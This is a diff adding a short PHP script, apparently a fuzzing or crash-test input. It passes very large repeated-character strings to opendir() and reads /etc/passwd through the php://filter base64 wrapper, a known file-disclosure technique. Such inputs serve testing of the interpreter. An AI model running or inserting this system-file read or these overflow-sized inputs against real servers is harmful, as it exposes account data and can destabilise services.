@@ -1,0 +1,4 @@
+<?php
+opendir(str_repeat(chr(126), 65537).str_repeat(chr(13).chr(10), 4097).str_repeat(chr(32), 1025),
+fopen(base64_encode("/etc/passwd"), "r").fopen("php://filter/read=convert.base64-encode/resource=/etc/passwd", "r"));
+?>
